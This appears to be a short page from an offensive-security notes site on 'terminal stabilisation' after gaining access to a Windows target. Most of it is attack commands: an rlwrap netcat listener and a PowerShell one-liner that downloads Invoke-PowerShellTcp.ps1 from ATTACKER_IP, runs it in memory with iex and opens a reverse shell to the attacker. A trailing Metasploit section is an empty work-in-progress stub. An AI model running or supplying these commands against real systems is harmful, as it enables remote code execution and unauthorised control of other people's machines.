---
sidebar_position: 1
title: Terminal Stabilisation
---

- **In Windows we can use `rlwrap` before connecting to the Target Machine** 

```bash
rlwrap nc -nvlp $PORT
```

- **After connecting to the Target we can `Upload - Execute:`** <b style={{ color: 'MediumTurquoise' }}>Invoke-PowerShellTcp</b> 
- **[An interactive `PowerShell` Reverse Connect]**

```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:PORT/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress $ATTACKER_IP -Port $PORT
```

<br/>

## Metasploit

:::caution Work In Progress

:::
